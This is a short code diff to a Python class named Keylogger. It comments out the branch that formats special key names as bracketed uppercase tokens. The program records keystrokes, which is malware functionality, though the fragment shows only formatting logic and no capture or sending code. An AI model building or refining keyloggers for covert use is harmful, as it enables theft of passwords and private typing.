@@ -85,9 +85,9 @@ class Keylogger:
                 name = "\n"
             elif name == "decimal":
                 name = "."
-            else:
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
+            # else:
+            #     name = name.replace(" ", "_")
+            #     name = f"[{name.upper()}]"
         self.log += name
 
     def report(self):
